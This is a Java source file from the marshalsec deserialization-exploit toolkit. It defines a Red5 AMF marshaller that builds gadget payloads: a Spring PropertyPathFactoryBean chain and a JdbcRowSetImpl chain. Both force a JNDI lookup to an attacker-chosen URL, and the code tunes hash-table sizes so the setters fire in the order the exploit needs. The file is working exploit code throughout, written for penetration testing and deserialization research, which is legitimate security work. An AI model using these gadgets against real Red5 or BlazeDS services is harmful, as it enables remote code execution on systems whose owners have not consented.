/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec;


import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.Map;

import org.apache.mina.core.buffer.IoBuffer;
import org.red5.io.amf.Input;
import org.red5.io.object.Deserializer;
import org.springframework.beans.factory.config.PropertyPathFactoryBean;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import com.sun.rowset.JdbcRowSetImpl;

import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.AbstractAmfInput;
import marshalsec.gadgets.Args;
import marshalsec.gadgets.JdbcRowSet;
import marshalsec.gadgets.Primary;
import marshalsec.util.Reflections;


/**
 * 
 * 
 * Uses BlazeDS for output
 * 
 * @author mbechler
 *
 */
public abstract class Red5AMFBase extends BlazeDSBase implements JdbcRowSet {

    /**
     * {@inheritDoc}
     *
     * @see marshalsec.BlazeDSBase#unmarshal(byte[])
     */
    @Override
    public Object unmarshal ( byte[] data ) throws Exception {
        IoBuffer buf = IoBuffer.wrap(data);
        Input i = createInput(buf);
        return Deserializer.deserialize(i, Object.class);
    }


    /**
     * @param buf
     * @return
     */
    protected abstract Input createInput ( IoBuffer buf );


    @Override
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makePropertyPathFactory ( UtilFactory uf, String[] args ) throws Exception {
        String jndiUrl = args[ 0 ];
        PropertyInjectingProxy bfproxy = new PropertyInjectingProxy(
            new SimpleJndiBeanFactory(),
            Collections.singletonMap("shareableResources", new String[] {
                jndiUrl
        }));

        // RED5 uses a regular HashMap to temporarily store the property values
        //
        // To make sure the property setters are called in the right order we
        // have to make sure that they end up in bins matching that order
        Map<String, Object> values = new LinkedHashMap<>();
        int size = 16;
        for ( ; size < Short.MAX_VALUE; size = size << 1 ) {
            long p = mapHash("propertyPath".hashCode() & 0xFFFFFFFFL) % size;
            long t = mapHash("targetBeanName".hashCode() & 0xFFFFFFFFL) % size;
            long b = mapHash("beanFactory".hashCode() & 0xFFFFFFFFL) % size;
            if ( p <= b && t <= b ) {
                System.err.println(String.format("propertyPath @ %d targetBeanName @ %d beanFactory @ %d with table size %d", p, t, b, size));
                break;
            }
        }

        values.put("propertyPath", "a");
        values.put("targetBeanName", jndiUrl);
        values.put("beanFactory", bfproxy);

        // this blows up the table to the desired size
        // keys must be distributed more or less evenly or the hash table won't expand to the desired size
        for ( int j = 0; j < size / 2; j++ ) {
            values.put("" + j, "");
        }

        return new PropertyInjectingProxy(new PropertyPathFactoryBean(), values);
    }


    @Override
    @Primary
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makeJdbcRowSet ( UtilFactory uf, String[] args ) throws Exception {
        Map<String, Object> values = new LinkedHashMap<>();
        int size = 16;

        // see makePropertyPathFactory for the gritty details
        for ( ; size < Short.MAX_VALUE; size = size << 1 ) {
            long d = mapHash("dataSourceName".hashCode() & 0xFFFFFFFFL) % size;
            long a = mapHash("autoCommit".hashCode() & 0xFFFFFFFFL) % size;
            if ( d <= a ) {
                System.err.println(String.format("dataSourceName @ %d autoCommit @ %d with table size %d", d, a, size));
                break;
            }
        }
        values.put("dataSourceName", args[ 0 ]);
        values.put("autoCommit", true);
        for ( int j = 0; j < size / 2; j++ ) {
            values.put("" + j, "");
        }
        return new PropertyInjectingProxy(Reflections.createWithoutConstructor(JdbcRowSetImpl.class), values);
    }


    /**
     * @param l
     * @return
     */
    private static long mapHash ( long l ) {
        return ( l ^ ( l >>> 16 ) );
    }


    /**
     * {@inheritDoc}
     *
     * @see marshalsec.BlazeDSBase#createInput(flex.messaging.io.SerializationContext)
     */
    @Override
    protected AbstractAmfInput createInput ( SerializationContext sc ) {
        return null;
    }

}
